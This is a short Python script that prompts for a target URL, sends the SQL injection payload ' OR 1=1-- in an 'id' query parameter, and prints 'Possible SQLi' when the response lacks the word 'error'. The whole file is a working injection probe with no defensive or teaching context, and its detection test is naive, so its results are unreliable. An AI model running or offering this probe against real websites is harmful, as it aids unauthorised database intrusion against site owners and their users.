import requests

payloads = ["' OR 1=1--"]

url = input("Target URL: ")

for p in payloads:
    r = requests.get(url + "?id=" + p)
    if "error" not in r.text:
        print("Possible SQLi with:", p)
